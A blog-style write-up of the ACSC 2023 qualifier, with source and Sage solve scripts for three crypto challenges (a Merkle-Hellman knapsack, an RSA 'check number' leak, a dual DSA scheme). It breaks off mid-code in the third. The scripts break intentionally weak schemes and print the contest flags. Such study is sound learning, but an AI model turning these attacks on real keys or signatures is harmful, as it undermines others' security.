<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  <title>2023 Acsc Quals</title><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v3.9.4" />
<meta property="og:title" content="2023 Acsc Quals" />
<meta name="author" content="김민순" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Wonder Why" />
<meta property="og:description" content="Wonder Why" />
<link rel="canonical" href="http://localhost:4000/2023-acsc-quals/" />
<meta property="og:url" content="http://localhost:4000/2023-acsc-quals/" />
<meta property="og:site_name" content="I’m such a good surfer" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-02-26T00:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="2023 Acsc Quals" />
<script type="application/ld+json">
{"description":"Wonder Why","url":"http://localhost:4000/2023-acsc-quals/","@type":"BlogPosting","headline":"2023 Acsc Quals","dateModified":"2023-02-26T00:00:00+09:00","datePublished":"2023-02-26T00:00:00+09:00","author":{"@type":"Person","name":"김민순"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023-acsc-quals/"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="I&apos;m such a good surfer" /><script type="text/x-mathjax-config">
MathJax.Hub.Config({
    TeX: {
      equationNumbers: {
        autoNumber: "AMS"
      }
    },
    tex2jax: {
    inlineMath: [ ['$', '$'] ],
    displayMath: [ ['$$', '$$'] ],
    processEscapes: true,
  }
});
MathJax.Hub.Register.MessageHook("Math Processing Error",function (message) {
	  alert("Math Processing Error: "+message[1]);
	});
MathJax.Hub.Register.MessageHook("TeX Jax - parse error",function (message) {
	  alert("Math Processing Error: "+message[1]);
	});
</script>


<script type="text/javascript" async
  src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
</script>

  <link rel="shortcut icon" type="image/x-icon" href="/logo.png" />
  <link rel="stylesheet" href="/assets/css/main.css" />
</head>
<body a="dark">
    <main class="page-content" aria-label="Content">
      <div class="w">
        <a href="/">cd ..</a><article>
  <p class="post-meta">
    <font size="2em">soon_haari</font>
    <time datetime="2023-02-26 00:00:00 +0900">2023-02-26</time>
  </p>
  
  <h1>2023 Acsc Quals</h1>

  <p><br /><br /></p>

<p><img src="../files/acsc/scoreboard.png" alt="Untitled" /></p>

<p>I finished 8th in South Korea, which is 52nd in total including not eligible players also.</p>

<p>I solved 3 crypto challenge, 1 reversing, 1 pwnable challenge.</p>

<p>The thing I felt was web/pwnable is sooo important for individual competition.</p>

<p>Crypto one-tool is not capable of this kind of contests.</p>

<p><br /><br /></p>

<h2 id="crypto---merkle-hellman-195-solves"><strong>Crypto - Merkle Hellman (195 solves)</strong></h2>

<h3 id="challpy"><strong>chall.py</strong></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">binascii</span>

<span class="k">def</span> <span class="nf">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">'modular inverse does not exist'</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>

<span class="k">def</span> <span class="nf">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span> 
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span> 
        <span class="k">return</span> <span class="n">b</span> 
    <span class="k">return</span> <span class="n">gcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span> 

<span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"flag.txt"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
<span class="c1"># Generate superincreasing sequence
</span><span class="n">w</span> <span class="o">=</span> <span class="p">[</span><span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)]</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">w</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">num</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">s</span><span class="o">+</span><span class="mi">256</span><span class="p">)</span>
    <span class="n">w</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
    <span class="n">s</span> <span class="o">+=</span> <span class="n">num</span>

<span class="c1"># Generate private key
</span><span class="n">total</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">w</span><span class="p">)</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="n">total</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">total</span><span class="o">+</span><span class="mi">256</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">gcd</span><span class="p">(</span><span class="n">r</span><span class="p">,</span><span class="n">q</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>

<span class="c1"># Calculate public key
</span><span class="n">b</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">w</span><span class="p">:</span>
    <span class="n">b</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="n">i</span> <span class="o">*</span> <span class="n">r</span><span class="p">)</span> <span class="o">%</span> <span class="n">q</span><span class="p">)</span>

<span class="c1"># Encrypting
</span><span class="n">c</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
    <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">f</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">64</span><span class="o">&gt;&gt;</span><span class="n">i</span><span class="p">):</span>
            <span class="n">s</span> <span class="o">+=</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
    <span class="n">c</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Public Key = </span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Private Key = </span><span class="si">{</span><span class="n">w</span><span class="p">,</span><span class="n">q</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Ciphertext = </span><span class="si">{</span><span class="n">c</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># Output:
# Public Key = [7352, 2356, 7579, 19235, 1944, 14029, 1084]
# Private Key = ([184, 332, 713, 1255, 2688, 5243, 10448], 20910)
# Ciphertext = [8436, 22465, 30044, 22465, 51635, 10380, 11879, 50551, 35250, 51223, 14931, 25048, 7352, 50551, 37606, 39550]
</span></code></pre></div></div>

<p>This can be solved by multiplying the inverse modulo q to the ciphertext, and decomposite with private key.</p>

<p>But it can be also solved with brute-forcing 2^7 cases. Simple challenge anyways.</p>

<p><br /></p>

<p><strong>ex.sage</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pubkey</span> <span class="o">=</span> <span class="p">[</span><span class="mi">7352</span><span class="p">,</span> <span class="mi">2356</span><span class="p">,</span> <span class="mi">7579</span><span class="p">,</span> <span class="mi">19235</span><span class="p">,</span> <span class="mi">1944</span><span class="p">,</span> <span class="mi">14029</span><span class="p">,</span> <span class="mi">1084</span><span class="p">]</span>
<span class="n">privkey</span><span class="p">,</span> <span class="n">q</span> <span class="o">=</span> <span class="p">([</span><span class="mi">184</span><span class="p">,</span> <span class="mi">332</span><span class="p">,</span> <span class="mi">713</span><span class="p">,</span> <span class="mi">1255</span><span class="p">,</span> <span class="mi">2688</span><span class="p">,</span> <span class="mi">5243</span><span class="p">,</span> <span class="mi">10448</span><span class="p">],</span> <span class="mi">20910</span><span class="p">)</span>
<span class="n">ct</span> <span class="o">=</span> <span class="p">[</span><span class="mi">8436</span><span class="p">,</span> <span class="mi">22465</span><span class="p">,</span> <span class="mi">30044</span><span class="p">,</span> <span class="mi">22465</span><span class="p">,</span> <span class="mi">51635</span><span class="p">,</span> <span class="mi">10380</span><span class="p">,</span> <span class="mi">11879</span><span class="p">,</span> <span class="mi">50551</span><span class="p">,</span> <span class="mi">35250</span><span class="p">,</span> <span class="mi">51223</span><span class="p">,</span> <span class="mi">14931</span><span class="p">,</span> <span class="mi">25048</span><span class="p">,</span> <span class="mi">7352</span><span class="p">,</span> <span class="mi">50551</span><span class="p">,</span> <span class="mi">37606</span><span class="p">,</span> <span class="mi">39550</span><span class="p">]</span>

<span class="n">r</span> <span class="o">=</span> <span class="p">(</span><span class="n">pubkey</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">/</span> <span class="n">privkey</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">%</span> <span class="n">q</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="k">assert</span> <span class="p">(</span><span class="n">privkey</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">*</span> <span class="n">r</span><span class="p">)</span> <span class="o">%</span> <span class="n">q</span> <span class="o">==</span> <span class="n">pubkey</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ct</span><span class="p">)):</span>
    <span class="n">ct</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ct</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">/</span> <span class="n">r</span><span class="p">)</span> <span class="o">%</span> <span class="n">q</span>

<span class="k">print</span><span class="p">(</span><span class="n">ct</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ct</span><span class="p">)):</span>
    <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">c</span> <span class="o">=</span> <span class="n">ct</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>

    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">c</span> <span class="o">&gt;=</span> <span class="n">privkey</span><span class="p">[</span><span class="mi">6</span> <span class="o">-</span> <span class="n">j</span><span class="p">]:</span>
            <span class="n">c</span> <span class="o">-=</span> <span class="n">privkey</span><span class="p">[</span><span class="mi">6</span> <span class="o">-</span> <span class="n">j</span><span class="p">]</span>
            <span class="n">val</span> <span class="o">+=</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">j</span><span class="p">)</span>

    <span class="k">assert</span> <span class="n">c</span> <span class="o">==</span> <span class="mi">0</span>

    <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">val</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1"># ACSC{E4zY_P3@zy}
</span></code></pre></div></div>

<p><br /><br /></p>

<h2 id="crypto---check_number_63-43-solves"><strong>Crypto - Check_number_63 (43 solves)</strong></h2>

<h3 id="problemsage"><strong>problem.sage</strong></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">gmpy2</span>
<span class="kn">from</span> <span class="nn">flag</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output.txt"</span><span class="p">,</span><span class="s">"w"</span><span class="p">)</span>

<span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"n = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="k">while</span> <span class="n">e</span> <span class="o">&lt;</span> <span class="mi">66173</span><span class="p">:</span>
  <span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
  <span class="n">check_number</span> <span class="o">=</span> <span class="p">(</span><span class="n">e</span><span class="o">*</span><span class="n">d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">)</span>
  <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">check_number</span><span class="si">}</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
  <span class="k">assert</span> <span class="p">(</span><span class="n">e</span><span class="o">*</span><span class="n">d</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">q</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
  <span class="n">e</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="n">next_prime</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
  
<span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>We are given with 63 different prime e values, and value of <code class="language-plaintext highlighter-rouge">(e \* d - 1) // phi</code>.</p>

<p>So if we say that value is a, <code class="language-plaintext highlighter-rouge">(e \* d - 1) = a \* phi</code>, so <code class="language-plaintext highlighter-rouge">a \* phi == -1 mod(e)</code>, and <code class="language-plaintext highlighter-rouge">phi == (-1 / a) mod(e)</code>.</p>

<p>We have 63 different e values, and with CRT, we can get phi’s value mod all the multiples of e.</p>

<p><br /></p>

<p>But the problem is all the multiples of e is still way smaller than n’s value.</p>

<p>Since <code class="language-plaintext highlighter-rouge">phi = n - (p + q) + 1</code>, subtracting it from n + 1, we can get (p + q) mod all the multiples of e.</p>

<p>p + q is relatively very small compared to phi, but still around few bits larger than m.</p>

<p>But adding m everytime (brute-force) was good enough for this.</p>

<p>With n and the phi value, we can easily factor n with quadratic formula.</p>

<p><br /></p>

<h3 id="exsage"><strong>ex.sage</strong></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha512</span>

<span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"output.txt"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>

<span class="k">exec</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">())</span>

<span class="n">mod</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">remain</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">63</span><span class="p">):</span>
    <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">a</span><span class="p">))</span>
    <span class="n">b</span> <span class="o">=</span> <span class="n">Integer</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">b</span><span class="p">))</span>
    <span class="n">mod</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">remain</span><span class="p">.</span><span class="n">append</span><span class="p">((</span><span class="o">-</span><span class="mi">1</span> <span class="o">/</span> <span class="n">b</span><span class="p">)</span> <span class="o">%</span> <span class="n">a</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="n">crt</span><span class="p">(</span><span class="n">remain</span><span class="p">,</span> <span class="n">mod</span><span class="p">)</span>

<span class="n">m</span> <span class="o">=</span> <span class="n">prod</span><span class="p">(</span><span class="n">mod</span><span class="p">)</span>

<span class="n">pplusq</span> <span class="o">=</span> <span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">-</span> <span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="n">m</span>

<span class="n">goal</span> <span class="o">=</span> <span class="p">(</span><span class="mi">2</span><span class="o">^</span><span class="mi">1024</span> <span class="o">//</span> <span class="n">m</span><span class="p">)</span> <span class="o">*</span> <span class="n">m</span>

<span class="n">pplusq</span> <span class="o">+=</span> <span class="n">goal</span>


<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">goal</span> <span class="o">//</span> <span class="n">m</span><span class="p">)):</span>
    <span class="n">pplusq</span> <span class="o">+=</span> <span class="n">m</span>

    <span class="k">if</span> <span class="n">Integer</span><span class="p">(</span><span class="n">pplusq</span><span class="o">^</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">n</span><span class="p">).</span><span class="n">sqrt</span><span class="p">()</span> <span class="ow">in</span> <span class="n">ZZ</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s">"yay"</span><span class="p">)</span>
        <span class="k">break</span>

<span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="o">-</span><span class="n">Integer</span><span class="p">(</span><span class="n">pplusq</span><span class="o">^</span><span class="mi">2</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">*</span> <span class="n">n</span><span class="p">).</span><span class="n">sqrt</span><span class="p">()</span> <span class="o">+</span> <span class="n">pplusq</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
<span class="n">q</span> <span class="o">=</span> <span class="n">pplusq</span> <span class="o">-</span> <span class="n">p</span>
<span class="k">assert</span> <span class="n">p</span> <span class="o">*</span> <span class="n">q</span> <span class="o">==</span> <span class="n">n</span>

<span class="n">flag</span> <span class="o">=</span> <span class="s">"ACSC{"</span> <span class="o">+</span> <span class="n">sha512</span><span class="p">(</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">p</span><span class="si">}{</span><span class="n">q</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span> <span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">+</span> <span class="s">"}"</span> 

<span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>

<span class="c1"># ACSC{02955bb28b6be53c08912dbf05a4081b763e69a191b39e632341a0cd37120ba3668c3f1e97815259dc46f0665b0713062d159cc85c47df77468819d367d25746}
</span></code></pre></div></div>

<p><br /><br /></p>

<h2 id="crypto---dual-signature-algorithm-21-solves"><strong>Crypto - Dual Signature Algorithm (21 solves)</strong></h2>

<h3 id="taskpy"><strong>task.py</strong></h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha256</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span><span class="p">,</span> <span class="n">isPrime</span><span class="p">,</span> <span class="n">getRandomNBitInteger</span><span class="p">,</span> <span class="n">inverse</span>


<span class="n">flag</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"FLAG"</span><span class="p">,</span> <span class="s">"neko{cat_are_the_most_powerful_beings_in_fact}"</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">h</span><span class="p">(</span><span class="n">m</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">sha256</span><span class="p">(</span><span class="n">m</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">gen_prime</span><span class="p">():</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">q</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">520</span><span class="p">)</span>
        <span class="n">p</span> <span class="o">=</span> <span class="mi">2</span><span class="o">*</span><span class="n">q</span> <span class="o">+</span> <span class="mi">1</span>
        <span class="k">if</span> <span class="n">isPrime</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
            <span class="k">return</span> <span class="n">p</span><span class="p">,</span> <span class="n">q</span>


<span class="n">p1</span><span class="p">,</span> <span class="n">q1</span> <span class="o">=</span> <span class="n">gen_prime</span><span class="p">()</span>
<span class="n">p2</span><span class="p">,</span> <span class="n">q2</span> <span class="o">=</span> <span class="n">gen_prime</span><span class="p">()</span>

<span class="k">if</span> <span class="n">q1</span> <span class="o">&gt;</span> <span class="n">q2</span><span class="p">:</span>
    <span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">q1</span><span class="p">),</span> <span class="p">(</span><span class="n">p2</span><span class="p">,</span> <span class="n">q2</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="n">p2</span><span class="p">,</span> <span class="n">q2</span><span class="p">),</span> <span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="n">q1</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="nb">int</span><span class="p">((</span><span class="n">os</span><span class="p">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">512</span> <span class="o">//</span> <span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">flag</span><span class="p">.</span><span class="n">encode</span><span class="p">()).</span><span class="nb">hex</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">g</span> <span class="o">=</span> <span class="mi">4</span>
<span class="n">y1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">p1</span><span class="p">)</span>
<span class="n">y2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">m</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">):</span>
    <span class="n">z</span> <span class="o">=</span> <span class="n">h</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">getRandomNBitInteger</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
    <span class="n">r1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">p1</span><span class="p">)</span>
    <span class="n">r2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">p2</span><span class="p">)</span>
    <span class="n">s1</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">q1</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">z</span> <span class="o">+</span> <span class="n">r1</span><span class="o">*</span><span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="n">q1</span>
    <span class="n">s2</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">q2</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">z</span> <span class="o">+</span> <span class="n">r2</span><span class="o">*</span><span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="n">q2</span>

    <span class="k">return</span> <span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="n">s1</span><span class="p">),</span> <span class="p">(</span><span class="n">r2</span><span class="p">,</span> <span class="n">s2</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">verify</span><span class="p">(</span><span class="n">m</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">sig1</span><span class="p">,</span> <span class="n">sig2</span><span class="p">):</span>
    <span class="n">z</span> <span class="o">=</span> <span class="n">h</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
    <span class="n">r1</span><span class="p">,</span> <span class="n">s1</span> <span class="o">=</span> <span class="n">sig1</span>
    <span class="n">r2</span><span class="p">,</span> <span class="n">s2</span> <span class="o">=</span> <span class="n">sig2</span>

    <span class="n">s1inv</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">s1</span><span class="p">,</span> <span class="n">q1</span><span class="p">)</span>
    <span class="n">s2inv</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">s2</span><span class="p">,</span> <span class="n">q2</span><span class="p">)</span>
    <span class="n">gk1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="n">s1inv</span><span class="o">*</span><span class="n">z</span><span class="p">,</span> <span class="n">p1</span><span class="p">)</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="n">y1</span><span class="p">,</span> <span class="n">s1inv</span><span class="o">*</span><span class="n">r1</span><span class="p">,</span> <span class="n">p1</span><span class="p">)</span> <span class="o">%</span> <span class="n">p1</span>
